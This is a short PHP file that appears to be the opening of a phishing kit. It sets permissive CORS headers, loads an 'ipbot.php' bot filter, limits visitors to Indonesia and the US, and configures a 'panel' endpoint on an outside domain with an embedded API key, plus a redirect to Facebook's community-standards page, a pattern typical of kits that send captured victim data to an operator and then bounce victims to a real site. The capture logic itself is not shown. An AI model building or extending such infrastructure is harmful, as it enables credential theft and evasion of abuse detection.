<?php
header("Access-Control-Allow-Origin: *");

require_once 'vendor/autoload.php';
require_once 'ipbot.php';

$config = [
    'allowed_countries' => ['ID', 'US'],
    'panel' => [
        'url' => 'https://haikal123.my.id/api/create.php',
        'api_key' => '124fcb-123594-0c9110-d0ce72-ac962f',
        'from' => 'WILKY GAZETTE',
        'subject' => 'AMERIKA SERIKAT'
    ],
    'redirect' => 'https://transparency.fb.com/policies/community-standards/'
];

function response_json($data)
{
    header("Content-Type: application/json");
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}
